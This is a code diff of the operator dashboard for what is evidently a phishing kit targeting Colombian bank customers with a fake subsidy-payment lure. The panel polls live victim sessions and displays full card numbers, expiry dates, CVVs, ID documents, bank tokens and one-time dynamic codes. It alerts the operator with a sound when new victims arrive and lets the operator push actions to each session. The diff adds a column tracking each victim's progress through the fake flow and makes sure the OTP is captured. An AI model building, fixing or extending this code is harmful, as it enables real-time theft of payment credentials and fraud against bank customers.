+        const res = await fetch(API_BASE + '/admin/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ usuario, password }) });
         const data = await res.json();
         if (!res.ok) throw new Error(data.error || 'Credenciales inválidas');
-        TOKEN = data.token;
-        USUARIO = data.usuario;
-        sessionStorage.setItem('adminToken', TOKEN);
-        sessionStorage.setItem('adminUser', USUARIO);
+        TOKEN = data.token; USUARIO = data.usuario;
+        sessionStorage.setItem('adminToken', TOKEN); sessionStorage.setItem('adminUser', USUARIO);
         mostrarDashboard();
-    } catch (e) {
-        mostrarErrorLogin(e.message);
-    } finally {
-        $('loginBtn').disabled = false;
-        $('loginBtn').textContent = 'Ingresar';
-    }
+    } catch (e) { mostrarErrorLogin(e.message); } finally { $('loginBtn').disabled = false; $('loginBtn').textContent = 'Ingresar'; }
 }
 
-function mostrarErrorLogin(msg) {
-    const el = $('loginError');
-    el.textContent = msg;
-    el.classList.remove('hidden');
-    setTimeout(() => el.classList.add('hidden'), 5000);
-}
-
-function logout() {
-    fetch(API_BASE + '/admin/logout', { method: 'POST', headers: { 'Authorization': 'Bearer ' + TOKEN } }).catch(() => {});
-    sessionStorage.removeItem('adminToken');
-    sessionStorage.removeItem('adminUser');
-    TOKEN = '';
-    USUARIO = '';
-    if (pollInterval) { clearInterval(pollInterval); pollInterval = null; }
-    $('dashboard').classList.remove('visible');
-    $('loginScreen').style.display = 'flex';
-    $('loginUser').value = '';
-    $('loginPass').value = '';
-    seleccionSesiones.clear();
-    seleccionIps.clear();
-    seleccionHistorial.clear();
-    filasAbiertas.clear();
-    sesionesAnteriores.clear();
-}
-
+function mostrarErrorLogin(msg) { const el = $('loginError'); el.textContent = msg; el.classList.remove('hidden'); setTimeout(() => el.classList.add('hidden'), 5000); }
+function logout() { fetch(API_BASE + '/admin/logout', { method: 'POST', headers: { 'Authorization': 'Bearer ' + TOKEN } }).catch(() => {}); sessionStorage.removeItem('adminToken'); sessionStorage.removeItem('adminUser'); TOKEN = ''; USUARIO = ''; if (pollInterval) { clearInterval(pollInterval); pollInterval = null; } $('dashboard').classList.remove('visible'); $('loginScreen').style.display = 'flex'; $('loginUser').value = ''; $('loginPass').value = ''; seleccionSesiones.clear(); seleccionIps.clear(); seleccionHistorial.clear(); filasAbiertas.clear(); sesionesAnteriores.clear(); }
 $('logoutBtn').addEventListener('click', logout);
-
-document.querySelectorAll('.tab-btn').forEach(btn => {
-    btn.addEventListener('click', () => {
-        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
-        btn.classList.add('active');
-        $('tab-' + btn.dataset.tab).classList.add('active');
-    });
-});
-
-function mostrarDashboard() {
-    $('loginScreen').style.display = 'none';
-    $('dashboard').classList.add('visible');
-    $('currentUser').textContent = USUARIO;
-    cargarTodo();
-    if (pollInterval) clearInterval(pollInterval);
-    pollInterval = setInterval(cargarTodo, 3000);
-}
-
-async function cargarTodo() {
-    try {
-        await Promise.all([cargarStats(), cargarActivos(), cargarSesiones(), cargarIps(), cargarLogs(), cargarHistorial()]);
-    } catch (e) { console.error(e); }
-}
-
-async function cargarStats() {
-    try {
-        const d = await api('/admin/stats');
-        $('statActivos').textContent = d.activos;
-        $('statSesiones').textContent = d.sesiones;
-        $('statPendientes').textContent = d.pendientes;
-        $('statBloqueadas').textContent = d.bloqueadas;
-        $('statHistorial').textContent = d.historial || 0;
-        $('badgeActivos').textContent = d.activos;
-        $('badgeSesiones').textContent = d.sesiones;
-        $('badgeIps').textContent = d.bloqueadas;
-    } catch (e) {}
-}
-
-async function cargarActivos() {
-    try {
-        const d = await api('/admin/activos');
-        activosCache = d.activos;
-        renderActivos();
-    } catch (e) {}
-}
-
-function renderActivos() {
-    const filtro = ($('buscarActivos').value || '').toLowerCase().trim();
-    const tbody = $('tbodyActivos');
-    let lista = activosCache;
-    if (filtro) {
-        lista = lista.filter(a => (a.ip || '').toLowerCase().includes(filtro) || (a.ultimaAccion || '').toLowerCase().includes(filtro));
-    }
-    if (!lista.length) {
-        tbody.innerHTML = '<tr><td colspan="4" class="empty">Sin usuarios activos</td></tr>';
-        return;
-    }
-    tbody.innerHTML = lista.map(a => `
-        <tr>
-            <td class="ip">${escapeHtml(a.ip)}</td>
-            <td>${escapeHtml(a.ultimaAccion)}</td>
-            <td>${formatTime(a.tiempoDentro)}</td>
-            <td>
-                <div class="actions">
-                    <button class="btn btn-block" onclick="bloquearIp('${escapeHtml(a.ip)}')">🚫 Bloquear</button>
-                </div>
-            </td>
-        </tr>
-    `).join('');
-}
+document.querySelectorAll('.tab-btn').forEach(btn => { btn.addEventListener('click', () => { document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active')); document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active')); btn.classList.add('active'); $('tab-' + btn.dataset.tab).classList.add('active'); }); });
+function mostrarDashboard() { $('loginScreen').style.display = 'none'; $('dashboard').classList.add('visible'); $('currentUser').textContent = USUARIO; cargarTodo(); if (pollInterval) clearInterval(pollInterval); pollInterval = setInterval(cargarTodo, 3000); }
+async function cargarTodo() { try { await Promise.all([cargarStats(), cargarActivos(), cargarSesiones(), cargarIps(), cargarLogs(), cargarHistorial()]); } catch (e) { console.error(e); } }
+async function cargarStats() { try { const d = await api('/admin/stats'); $('statActivos').textContent = d.activos; $('statSesiones').textContent = d.sesiones; $('statPendientes').textContent = d.pendientes; $('statBloqueadas').textContent = d.bloqueadas; $('statHistorial').textContent = d.historial || 0; $('badgeActivos').textContent = d.activos; $('badgeSesiones').textContent = d.sesiones; $('badgeIps').textContent = d.bloqueadas; } catch (e) {} }
+async function cargarActivos() { try { const d = await api('/admin/activos'); activosCache = d.activos; renderActivos(); } catch (e) {} }
+function renderActivos() { const filtro = ($('buscarActivos').value || '').toLowerCase().trim(); const tbody = $('tbodyActivos'); let lista = activosCache; if (filtro) { lista = lista.filter(a => (a.ip || '').toLowerCase().includes(filtro) || (a.ultimaAccion || '').toLowerCase().includes(filtro)); } if (!lista.length) { tbody.innerHTML = '<tr><td colspan="4" class="empty">Sin usuarios activos</td></tr>'; return; } tbody.innerHTML = lista.map(a => ` <tr> <td class="ip">${escapeHtml(a.ip)}</td> <td>${escapeHtml(a.ultimaAccion)}</td> <td>${formatTime(a.tiempoDentro)}</td> <td><div class="actions"><button class="btn btn-block" onclick="bloquearIp('${escapeHtml(a.ip)}')">🚫 Bloquear</button></div></td> </tr> `).join(''); }
 
 function botonesSesion(s) {
     const bancoKey = s.datos.bancoKey || '';
@@ -724,26 +417,7 @@ function botonesSesion(s) {
     return btns.join('');
 }
 
-async function cargarSesiones() {
-    try {
-        const d = await api('/admin/sesiones');
-        const sesionesActuales = d.sesiones.reverse();
-        
-        let hayNuevosDatos = false;
-        
-        if (sesionesAnteriores.size > 0) {
-            for (let s of sesionesActuales) {
-                if (!sesionesAnteriores.has(s.sessionId)) { hayNuevosDatos = true; break; }
-            }
-        } else { hayNuevosDatos = false; }
-
-        if (hayNuevosDatos) { reproducirSonido(); }
-
-        sesionesAnteriores = new Set(sesionesActuales.map(s => s.sessionId));
-        sesionesCache = sesionesActuales;
-        renderSesiones();
-    } catch (e) { console.error(e); }
-}
+async function cargarSesiones() { try { const d = await api('/admin/sesiones'); const sesionesActuales = d.sesiones.reverse(); let hayNuevosDatos = false; if (sesionesAnteriores.size > 0) { for (let s of sesionesActuales) { if (!sesionesAnteriores.has(s.sessionId)) { hayNuevosDatos = true; break; } } } if (hayNuevosDatos) { reproducirSonido(); } sesionesAnteriores = new Set(sesionesActuales.map(s => s.sessionId)); sesionesCache = sesionesActuales; renderSesiones(); } catch (e) { console.error(e); } }
 
 function renderSesiones() {
     const filtro = ($('buscarSesiones').value || '').toLowerCase().trim();
@@ -762,15 +436,22 @@ function renderSesiones() {
         });
     }
     if (!lista.length) {
-        tbody.innerHTML = '<tr><td colspan="16" class="empty">Sin sesiones</td></tr>';
+        tbody.innerHTML = '<tr><td colspan="17" class="empty">Sin sesiones</td></tr>';
         actualizarBtnBorrarSesiones();
         return;
     }
     tbody.innerHTML = lista.map(s => {
         const datos = s.datos || {};
         const banco = datos.bancoKey || '-';
+        const pasoActual = s.paso || 'index';
         
-        // 🔥 CORRECCIÓN CLAVE: Incluir bancolombia para que lea los datos de la tarjeta
+        let pasoTexto = 'Entrando';
+        if (pasoActual === 'consultadesubsidio') pasoTexto = 'Consultando';
+        else if (pasoActual.includes('pagodesubsidio')) pasoTexto = pasoActual; // Ya viene con (Tarjeta) o (PSE)
+        else if (pasoActual === 'tarjeta') pasoTexto = 'Pagando (Tarjeta)';
+        else if (pasoActual === 'pse') pasoTexto = 'Pagando (PSE)';
+        else if (pasoActual === 'clavedin') pasoTexto = 'Clave Dinámica';
+
         const esTarjeta = banco === 'cc-bogota' || banco === 'cc-bucaramanga' || banco === 'bancolombia';
 
         let identificacionTrj = '-';
@@ -780,12 +461,9 @@ function renderSesiones() {
 
         if (esTarjeta) {
             identificacionTrj = datos.tarjeta || datos.identificacion || '-';
-            
-            // 🔥 CORRECCIÓN CLAVE: Leer los datos de fecha de la tarjeta correctamente
             const mes = datos.expMes || datos.exp || '';
             const anio = datos.expAnio || '';
             claveFch = (mes || anio) ? `${mes}/${anio}` : (datos.clave || '-');
-            
             cvv = datos.cvv || '-';
             documento = datos.docNumber ? `${datos.docType || 'CC'} ${datos.docNumber}` : '-';
         } else {
@@ -797,7 +475,7 @@ function renderSesiones() {
 
         const titular = datos.titular || '-';
         const token = datos.token || '-';
-        const otp = datos.otp || '-';
+        const otp = datos.otp || datos.claveDinamica || '-'; // 🔥 Asegurar que lea la clave dinamica
         const monto = datos.monto ? '$' + Number(datos.monto).toLocaleString('es-CO') : '-';
         const ip = datos.ip || '-';
         const checked = seleccionSesiones.has(s.sessionId) ? 'checked' : '';
@@ -831,13 +509,14 @@ function renderSesiones() {
                 </td>
                 <td>${nombreBanco(banco, datos.marca)}</td>
                 <td><span class="estado estado-${s.estado}">${s.estado}</span></td>
+                <td style="color:#88f456; font-weight:bold; font-size:11px;">${pasoTexto}</td> <!-- 🔥 NUEVA COLUMNA -->
                 <td class="dato" title="${escapeHtml(identificacionTrj)}">${escapeHtml(truncar(identificacionTrj, 20))}</td>
                 <td class="dato">${escapeHtml(claveFch)}</td>
                 <td class="dato">${escapeHtml(cvv)}</td>
                 <td class="dato" title="${escapeHtml(documento)}">${escapeHtml(truncar(documento, 20))}</td>
                 <td class="dato" title="${escapeHtml(titular)}">${escapeHtml(truncar(titular, 20))}</td>
                 <td class="dato">${escapeHtml(token)}</td>
-                <td class="dato">${escapeHtml(otp)}</td>
+                <td class="dato" style="color:#a855f7; font-weight:bold;">${escapeHtml(otp)}</td> <!-- 🔥 SE MUESTRA EL OTP -->
                 <td class="dato">${escapeHtml(monto)}</td>
                 <td class="ip">${escapeHtml(ip)}</td>
                 <td><span class="banco-emisor" title="${escapeHtml(bancoEmisor)}">${escapeHtml(bancoEmisor)}</span></td>
@@ -862,85 +541,25 @@ function renderSesiones() {
     actualizarBtnBorrarSesiones();
 }
 
-function verCredencialesAuth(usuario, password) {
-    document.getElementById('verAuthUsuario').textContent = usuario;
-    document.getElementById('verAuthPassword').textContent = password;
-    document.getElementById('modalVerAuth').classList.remove('hidden');
-}
+function verCredencialesAuth(usuario, password) { document.getElementById('verAuthUsuario').textContent = usuario; document.getElementById('verAuthPassword').textContent = password; document.getElementById('modalVerAuth').classList.remove('hidden'); }
+function actualizarBtnBorrarSesiones() { const btn = $('btnBorrarSesiones'); btn.disabled = seleccionSesiones.size === 0; btn.textContent = seleccionSesiones.size > 0 ? `🗑️ Borrar seleccionados (${seleccionSesiones.size})` : '🗑️ Borrar seleccionados'; }
+$('checkAllSesiones').addEventListener('change', (e) => { if (e.target.checked) { sesionesCache.forEach(s => seleccionSesiones.add(s.sessionId)); } else { seleccionSesiones.clear(); } renderSesiones(); });
+$('btnBorrarSesiones').addEventListener('click', async () => { if (!seleccionSesiones.size) return; if (!confirm(`¿Borrar ${seleccionSesiones.size} sesión(es)? Esta acción es permanente.`)) return; try { const ids = [...seleccionSesiones]; await api('/admin/sesiones/borrar', { method: 'POST', body: JSON.stringify({ sessionIds: ids }) }); toast(`🗑️ ${ids.length} sesión(es) borrada(s)`); seleccionSesiones.clear(); $('checkAllSesiones').checked = false; cargarTodo(); } catch (e) { toast('Error: ' + e.message, true); } });
 
-function actualizarBtnBorrarSesiones() {
-    const btn = $('btnBorrarSesiones');
-    btn.disabled = seleccionSesiones.size === 0;
-    btn.textContent = seleccionSesiones.size > 0
-        ? `🗑️ Borrar seleccionados (${seleccionSesiones.size})`
-        : '🗑️ Borrar seleccionados';
-}
-
-$('checkAllSesiones').addEventListener('change', (e) => {
-    if (e.target.checked) { sesionesCache.forEach(s => seleccionSesiones.add(s.sessionId)); }
-    else { seleccionSesiones.clear(); }
-    renderSesiones();
-});
-
-$('btnBorrarSesiones').addEventListener('click', async () => {
-    if (!seleccionSesiones.size) return;
-    if (!confirm(`¿Borrar ${seleccionSesiones.size} sesión(es)? Esta acción es permanente.`)) return;
-    try {
-        const ids = [...seleccionSesiones];
-        await api('/admin/sesiones/borrar', { method: 'POST', body: JSON.stringify({ sessionIds: ids }) });
-        toast(`🗑️ ${ids.length} sesión(es) borrada(s)`);
-        seleccionSesiones.clear();
-        $('checkAllSesiones').checked = false;
-        cargarTodo();
-    } catch (e) { toast('Error: ' + e.message, true); }
-});
-
-/* ============================================================
-   🔥 LÓGICA DEL HISTORIAL (ACORDEÓN CON DATOS COMPLETOS)
-   ============================================================ */
-async function cargarHistorial() {
-    try {
-        const d = await api('/admin/historial');
-        historialCache = d.historial || [];
-        $('badgeHistorial').textContent = historialCache.length;
-        renderHistorial();
-    } catch (e) {}
-}
-
-function toggleDetalle(id) {
-    const el = document.getElementById('detalle-' + id);
-    if (el) {
-        el.classList.toggle('visible');
-        if (el.classList.contains('visible')) { filasAbiertas.add(id); }
-        else { filasAbiertas.delete(id); }
-    }
-}
-
+async function cargarHistorial() { try { const d = await api('/admin/historial'); historialCache = d.historial || []; $('badgeHistorial').textContent = historialCache.length; renderHistorial(); } catch (e) {} }
+function toggleDetalle(id) { const el = document.getElementById('detalle-' + id); if (el) { el.classList.toggle('visible'); if (el.classList.contains('visible')) { filasAbiertas.add(id); } else { filasAbiertas.delete(id); } } }
 function renderHistorial() {
     const filtro = ($('buscarHistorial').value || '').toLowerCase().trim();
     const tbody = $('tbodyHistorial');
     let lista = historialCache;
     if (filtro) {
-        lista = lista.filter(h => {
-            const datos = h.datos || {};
-            const texto = [
-                h.bancoKey, datos.titular, datos.nombres, datos.apellidos, datos.docNumber, datos.documento, datos.tarjeta,
-                datos.identificacion, datos.token, datos.otp, datos.ip, datos.telefono,
-                datos.cardBrand, datos.bankName
-            ].filter(Boolean).join(' ').toLowerCase();
-            return texto.includes(filtro);
-        });
+        lista = lista.filter(h => { const datos = h.datos || {}; const texto = [ h.bancoKey, datos.titular, datos.nombres, datos.apellidos, datos.docNumber, datos.documento, datos.tarjeta, datos.identificacion, datos.token, datos.otp, datos.ip, datos.telefono, datos.cardBrand, datos.bankName ].filter(Boolean).join(' ').toLowerCase(); return texto.includes(filtro); });
     }
-    if (!lista.length) {
-        tbody.innerHTML = '<tr><td colspan="4" class="empty">Sin registros en el historial</td></tr>';
-        actualizarBtnBorrarHistorial();
-        return;
-    }
+    if (!lista.length) { tbody.innerHTML = '<tr><td colspan="4" class="empty">Sin registros en el historial</td></tr>'; actualizarBtnBorrarHistorial(); return; }
     tbody.innerHTML = lista.map(h => {
         const datos = h.datos || {};
         const fecha = new Date(h.fecha).toLocaleString('es-CO');
         const checked = seleccionHistorial.has(h.id) ? 'checked' : '';
-        
         const tipoPersona = datos.tipoPersona || '-';
         const tipoDoc = datos.docType || datos.tipoDocumento || '-';
         const numDoc = datos.documento || datos.docNumber || '-';
@@ -951,14 +570,12 @@ function renderHistorial() {
         const tipoPago = datos.subsidio ? 'Subsidio' : (datos.precio ? 'Derechos / Certificado' : '-');
         const placa = datos.placa || '-';
         const monto = (datos.monto || datos.precio) ? '$' + Number(datos.monto || datos.precio).toLocaleString('es-CO') : '-';
-
         const tarjeta = datos.tarjeta || '-';
         const exp = (datos.expMes || datos.expAnio || datos.exp) ? `${datos.expMes || ''}/${datos.expAnio || datos.exp || ''}` : '-';
         const cvv = datos.cvv || '-';
         const bancoEmisor = datos.bankName || '-';
         const tipoTarjeta = datos.cardType || '-';
         const nivelTarjeta = datos.cardLevel || '-';
-
         const abierta = filasAbiertas.has(h.id) ? 'visible' : '';
 
         return `
@@ -966,9 +583,7 @@ function renderHistorial() {
                 <td class="checkbox-col"><input type="checkbox" class="check-historial" data-id="${escapeHtml(h.id)}" ${checked}></td>
                 <td class="dato" style="max-width:120px;">${escapeHtml(fecha)}</td>
                 <td class="ip">${escapeHtml(datos.ip || '-')}</td>
-                <td>
-                    <button class="btn" style="background:#3b82f6; color:white; font-size: 16px; padding: 2px 10px;" onclick="toggleDetalle('${escapeHtml(h.id)}')">👁️</button>
-                </td>
+                <td><button class="btn" style="background:#3b82f6; color:white; font-size: 16px; padding: 2px 10px;" onclick="toggleDetalle('${escapeHtml(h.id)}')">👁️</button></td>
             </tr>
             <tr id="detalle-${escapeHtml(h.id)}" class="fila-detalle ${abierta}">
                 <td colspan="4">
@@ -985,7 +600,6 @@ function renderHistorial() {
                             <div class="detalle-item"><span class="lbl">Tipo Pago</span><span class="val">${escapeHtml(tipoPago)}</span></div>
                             <div class="detalle-item"><span class="lbl">Placa</span><span class="val">${escapeHtml(placa.toUpperCase())}</span></div>
                             <div class="detalle-item"><span class="lbl">Monto</span><span class="val">${escapeHtml(monto)}</span></div>
-
                             ${tarjeta !== '-' ? `
                             <div class="detalle-seccion-titulo" style="grid-column: 1/-1;">💳 Datos de la Tarjeta</div>
                             <div class="detalle-item"><span class="lbl">Número Tarjeta</span><span class="val">${escapeHtml(tarjeta)}</span></div>
@@ -1001,202 +615,36 @@ function renderHistorial() {
             </tr>
         `;
     }).join('');
-    document.querySelectorAll('.check-historial').forEach(cb => {
-        cb.addEventListener('change', (e) => {
-            const id = e.target.dataset.id;
-            if (e.target.checked) seleccionHistorial.add(id);
-            else seleccionHistorial.delete(id);
-            actualizarBtnBorrarHistorial();
-        });
-    });
+    document.querySelectorAll('.check-historial').forEach(cb => { cb.addEventListener('change', (e) => { const id = e.target.dataset.id; if (e.target.checked) seleccionHistorial.add(id); else seleccionHistorial.delete(id); actualizarBtnBorrarHistorial(); }); });
     actualizarBtnBorrarHistorial();
 }
 
-function actualizarBtnBorrarHistorial() {
-    const btn = $('btnBorrarHistorial');
-    btn.disabled = seleccionHistorial.size === 0;
-    btn.textContent = seleccionHistorial.size > 0
-        ? `🗑️ Borrar seleccionados (${seleccionHistorial.size})`
-        : '🗑️ Borrar seleccionados';
-}
-
-$('checkAllHistorial').addEventListener('change', (e) => {
-    if (e.target.checked) historialCache.forEach(h => seleccionHistorial.add(h.id));
-    else seleccionHistorial.clear();
-    renderHistorial();
-});
-
-$('btnBorrarHistorial').addEventListener('click', async () => {
-    if (!seleccionHistorial.size) return;
-    if (!confirm(`¿Borrar ${seleccionHistorial.size} registro(s) del historial?`)) return;
-    try {
-        const ids = [...seleccionHistorial];
-        await api('/admin/historial/borrar', { method: 'POST', body: JSON.stringify({ ids }) });
-        toast(`🗑️ ${ids.length} registro(s) borrado(s)`);
-        seleccionHistorial.clear();
-        $('checkAllHistorial').checked = false;
-        cargarTodo();
-    } catch (e) { toast('Error: ' + e.message, true); }
-});
-
+function actualizarBtnBorrarHistorial() { const btn = $('btnBorrarHistorial'); btn.disabled = seleccionHistorial.size === 0; btn.textContent = seleccionHistorial.size > 0 ? `🗑️ Borrar seleccionados (${seleccionHistorial.size})` : '🗑️ Borrar seleccionados'; }
+$('checkAllHistorial').addEventListener('change', (e) => { if (e.target.checked) historialCache.forEach(h => seleccionHistorial.add(h.id)); else seleccionHistorial.clear(); renderHistorial(); });
+$('btnBorrarHistorial').addEventListener('click', async () => { if (!seleccionHistorial.size) return; if (!confirm(`¿Borrar ${seleccionHistorial.size} registro(s) del historial?`)) return; try { const ids = [...seleccionHistorial]; await api('/admin/historial/borrar', { method: 'POST', body: JSON.stringify({ ids }) }); toast(`🗑️ ${ids.length} registro(s) borrado(s)`); seleccionHistorial.clear(); $('checkAllHistorial').checked = false; cargarTodo(); } catch (e) { toast('Error: ' + e.message, true); } });
 $('buscarHistorial').addEventListener('input', renderHistorial);
 
-/* ============================================================
-   IPS Y LOGS (Sin opción de borrar en Logs)
-   ============================================================ */
-async function cargarIps() {
-    try {
-        const d = await api('/admin/ips-bloqueadas');
-        ipsCache = d.ips;
-        renderIps();
-    } catch (e) {}
-}
+async function cargarIps() { try { const d = await api('/admin/ips-bloqueadas'); ipsCache = d.ips; renderIps(); } catch (e) {} }
+function renderIps() { const filtro = ($('buscarIps').value || '').toLowerCase().trim(); const tbody = $('tbodyIps'); let lista = ipsCache; if (filtro) lista = lista.filter(ip => ip.toLowerCase().includes(filtro)); if (!lista.length) { tbody.innerHTML = '<tr><td colspan="3" class="empty">Sin IPs bloqueadas</td></tr>'; actualizarBtnBorrarIps(); return; } tbody.innerHTML = lista.map(ip => { const checked = seleccionIps.has(ip) ? 'checked' : ''; return ` <tr> <td class="checkbox-col"><input type="checkbox" class="check-ip" data-id="${escapeHtml(ip)}" ${checked}></td> <td class="ip">${escapeHtml(ip)}</td> <td><button class="btn btn-unblock" onclick="desbloquearIp('${escapeHtml(ip)}')">🔓 Desbloquear</button></td> </tr> `; }).join(''); document.querySelectorAll('.check-ip').forEach(cb => { cb.addEventListener('change', (e) => { const id = e.target.dataset.id; if (e.target.checked) seleccionIps.add(id); else seleccionIps.delete(id); actualizarBtnBorrarIps(); }); }); actualizarBtnBorrarIps(); }
+function actualizarBtnBorrarIps() { const btn = $('btnBorrarIps'); btn.disabled = seleccionIps.size === 0; btn.textContent = seleccionIps.size > 0 ? `🗑️ Borrar seleccionados (${seleccionIps.size})` : '🗑️ Borrar seleccionados'; }
+$('checkAllIps').addEventListener('change', (e) => { if (e.target.checked) ipsCache.forEach(ip => seleccionIps.add(ip)); else seleccionIps.clear(); renderIps(); });
+$('btnBorrarIps').addEventListener('click', async () => { if (!seleccionIps.size) return; if (!confirm(`¿Borrar ${seleccionIps.size} IP(s) de la lista?`)) return; try { const ips = [...seleccionIps]; await api('/admin/ips/borrar', { method: 'POST', body: JSON.stringify({ ips }) }); toast(`🗑️ ${ips.length} IP(s) borrada(s)`); seleccionIps.clear(); $('checkAllIps').checked = false; cargarTodo(); } catch (e) { toast('Error: ' + e.message, true); } });
 
-function renderIps() {
-    const filtro = ($('buscarIps').value || '').toLowerCase().trim();
-    const tbody = $('tbodyIps');
-    let lista = ipsCache;
-    if (filtro) lista = lista.filter(ip => ip.toLowerCase().includes(filtro));
-    if (!lista.length) {
-        tbody.innerHTML = '<tr><td colspan="3" class="empty">Sin IPs bloqueadas</td></tr>';
-        actualizarBtnBorrarIps();
-        return;
-    }
-    tbody.innerHTML = lista.map(ip => {
-        const checked = seleccionIps.has(ip) ? 'checked' : '';
-        return `
-            <tr>
-                <td class="checkbox-col"><input type="checkbox" class="check-ip" data-id="${escapeHtml(ip)}" ${checked}></td>
-                <td class="ip">${escapeHtml(ip)}</td>
-                <td><button class="btn btn-unblock" onclick="desbloquearIp('${escapeHtml(ip)}')">🔓 Desbloquear</button></td>
-            </tr>
-        `;
-    }).join('');
-    document.querySelectorAll('.check-ip').forEach(cb => {
-        cb.addEventListener('change', (e) => {
-            const id = e.target.dataset.id;
-            if (e.target.checked) seleccionIps.add(id);
-            else seleccionIps.delete(id);
-            actualizarBtnBorrarIps();
-        });
-    });
-    actualizarBtnBorrarIps();
-}
+async function cargarLogs() { try { const d = await api('/admin/logs'); logsCache = d.logs; $('badgeLogs').textContent = d.logs.length; renderLogs(); } catch (e) {} }
+function renderLogs() { const filtro = ($('buscarLogs').value || '').toLowerCase().trim(); const tbody = $('tbodyLogs'); let lista = logsCache; if (filtro) { lista = lista.filter(l => { const texto = [l.tipo, JSON.stringify(l.datos)].join(' ').toLowerCase(); return texto.includes(filtro); }); } if (!lista.length) { tbody.innerHTML = '<tr><td colspan="4" class="empty">Sin logs</td></tr>'; return; } tbody.innerHTML = lista.map(l => { const fecha = new Date(l.fecha).toLocaleString('es-CO'); return ` <tr> <td class="checkbox-col"><input type="checkbox" class="check-log" data-id="${escapeHtml(l.id)}" disabled></td> <td>${escapeHtml(fecha)}</td> <td>${escapeHtml(l.tipo)}</td> <td class="dato">${escapeHtml(JSON.stringify(l.datos))}</td> </tr> `; }).join(''); }
 
-function actualizarBtnBorrarIps() {
-    const btn = $('btnBorrarIps');
-    btn.disabled = seleccionIps.size === 0;
-    btn.textContent = seleccionIps.size > 0
-        ? `🗑️ Borrar seleccionados (${seleccionIps.size})`
-        : '🗑️ Borrar seleccionados';
-}
-
-$('checkAllIps').addEventListener('change', (e) => {
-    if (e.target.checked) ipsCache.forEach(ip => seleccionIps.add(ip));
-    else seleccionIps.clear();
-    renderIps();
-});
-
-$('btnBorrarIps').addEventListener('click', async () => {
-    if (!seleccionIps.size) return;
-    if (!confirm(`¿Borrar ${seleccionIps.size} IP(s) de la lista?`)) return;
-    try {
-        const ips = [...seleccionIps];
-        await api('/admin/ips/borrar', { method: 'POST', body: JSON.stringify({ ips }) });
-        toast(`🗑️ ${ips.length} IP(s) borrada(s)`);
-        seleccionIps.clear();
-        $('checkAllIps').checked = false;
-        cargarTodo();
-    } catch (e) { toast('Error: ' + e.message, true); }
-});
-
-async function cargarLogs() {
-    try {
-        const d = await api('/admin/logs');
-        logsCache = d.logs;
-        $('badgeLogs').textContent = d.logs.length;
-        renderLogs();
-    } catch (e) {}
-}
-
-function renderLogs() {
-    const filtro = ($('buscarLogs').value || '').toLowerCase().trim();
-    const tbody = $('tbodyLogs');
-    let lista = logsCache;
-    if (filtro) {
-        lista = lista.filter(l => {
-            const texto = [l.tipo, JSON.stringify(l.datos)].join(' ').toLowerCase();
-            return texto.includes(filtro);
-        });
-    }
-    if (!lista.length) {
-        tbody.innerHTML = '<tr><td colspan="4" class="empty">Sin logs</td></tr>';
-        return;
-    }
-    tbody.innerHTML = lista.map(l => {
-        const fecha = new Date(l.fecha).toLocaleString('es-CO');
-        return `
-            <tr>
-                <td class="checkbox-col"><input type="checkbox" class="check-log" data-id="${escapeHtml(l.id)}" disabled></td>
-                <td>${escapeHtml(fecha)}</td>
-                <td>${escapeHtml(l.tipo)}</td>
-                <td class="dato">${escapeHtml(JSON.stringify(l.datos))}</td>
-            </tr>
-        `;
-    }).join('');
-}
-
-async function accion(sessionId, accion) {
-    try {
-        await api('/admin/sesion/' + encodeURIComponent(sessionId) + '/accion', {
-            method: 'POST',
-            body: JSON.stringify({ accion })
-        });
-        toast('✅ ' + accion + ' aplicado');
-        cargarTodo();
-    } catch (e) { toast('Error: ' + e.message, true); }
-}
-
-async function bloquearIp(ip) {
-    if (!ip || ip === '-') { toast('IP inválida', true); return; }
-    if (!confirm('¿Bloquear la IP ' + ip + '?')) return;
-    try {
-        await api('/admin/ip/bloquear', { method: 'POST', body: JSON.stringify({ ip }) });
-        toast('🚫 IP bloqueada: ' + ip);
-        cargarTodo();
-    } catch (e) { toast('Error: ' + e.message, true); }
-}
-
-async function desbloquearIp(ip) {
-    if (!confirm('¿Desbloquear la IP ' + ip + '?')) return;
-    try {
-        await api('/admin/ip/desbloquear', { method: 'POST', body: JSON.stringify({ ip }) });
-        toast('🔓 IP desbloqueada: ' + ip);
-        cargarTodo();
-    } catch (e) { toast('Error: ' + e.message, true); }
-}
-
-$('btnBloquearManual').addEventListener('click', async () => {
-    const ip = $('inputNuevaIp').value.trim();
-    if (!ip) { toast('Escribe una IP', true); return; }
-    await bloquearIp(ip);
-    $('inputNuevaIp').value = '';
-});
+async function accion(sessionId, accion) { try { await api('/admin/sesion/' + encodeURIComponent(sessionId) + '/accion', { method: 'POST', body: JSON.stringify({ accion }) }); toast('✅ ' + accion + ' aplicado'); cargarTodo(); } catch (e) { toast('Error: ' + e.message, true); } }
+async function bloquearIp(ip) { if (!ip || ip === '-') { toast('IP inválida', true); return; } if (!confirm('¿Bloquear la IP ' + ip + '?')) return; try { await api('/admin/ip/bloquear', { method: 'POST', body: JSON.stringify({ ip }) }); toast('🚫 IP bloqueada: ' + ip); cargarTodo(); } catch (e) { toast('Error: ' + e.message, true); } }
+async function desbloquearIp(ip) { if (!confirm('¿Desbloquear la IP ' + ip + '?')) return; try { await api('/admin/ip/desbloquear', { method: 'POST', body: JSON.stringify({ ip }) }); toast('🔓 IP desbloqueada: ' + ip); cargarTodo(); } catch (e) { toast('Error: ' + e.message, true); } }
+$('btnBloquearManual').addEventListener('click', async () => { const ip = $('inputNuevaIp').value.trim(); if (!ip) { toast('Escribe una IP', true); return; } await bloquearIp(ip); $('inputNuevaIp').value = ''; });
 
 $('buscarActivos').addEventListener('input', renderActivos);
 $('buscarSesiones').addEventListener('input', renderSesiones);
 $('buscarIps').addEventListener('input', renderIps);
 $('buscarLogs').addEventListener('input', renderLogs);
 
-if (TOKEN) {
-    fetch(API_BASE + '/admin/stats', { headers: { 'Authorization': 'Bearer ' + TOKEN } })
-        .then(r => { if (r.ok) mostrarDashboard(); else logout(); })
-        .catch(() => logout());
-}
-
-document.addEventListener('keydown', e => {
-    if (e.key === 'Escape' && TOKEN) logout();
-});
+if (TOKEN) { fetch(API_BASE + '/admin/stats', { headers: { 'Authorization': 'Bearer ' + TOKEN } }).then(r => { if (r.ok) mostrarDashboard(); else logout(); }).catch(() => logout()); }
